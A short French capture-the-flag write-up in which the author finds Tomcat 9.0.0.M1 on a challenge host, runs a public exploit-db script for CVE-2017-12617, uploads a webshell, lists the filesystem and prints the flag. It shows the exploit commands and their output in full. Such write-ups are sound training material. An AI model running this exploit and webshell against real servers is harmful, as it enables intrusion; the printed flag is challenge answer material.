# Walter Blog


Lors de la reconnaissance, on peux remarqué que nous avons a faire au service `tomcat 9.0.0.M1`

On recherche une vulnérabilité sur ce service: https://www.exploit-db.com/exploits/42966


On exploit:
```
$python 42966.py -u http://waltersblog3.chall.malicecyber.com



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Poc Filename  Poc.jsp
http://waltersblog3.chall.malicecyber.com it's Vulnerable to CVE-2017-12617
http://waltersblog3.chall.malicecyber.com/Poc.jsp
```

C'est vulnérable ? Bah allons y alors !

```
$python 42966.py -u http://waltersblog3.chall.malicecyber.com -p shell.war 



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Uploading Webshell .....
$ ls


    

    

    

    
    

bin
boot
dev
entrypoint.sh
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
supervisord.log
supervisord.pid
sys
tmp
usr
var


$ cat flag.txt	


    

    

    

    
    

flag{i4lW4y5UpD4T3Y0urt0mC@}


$ exit
```

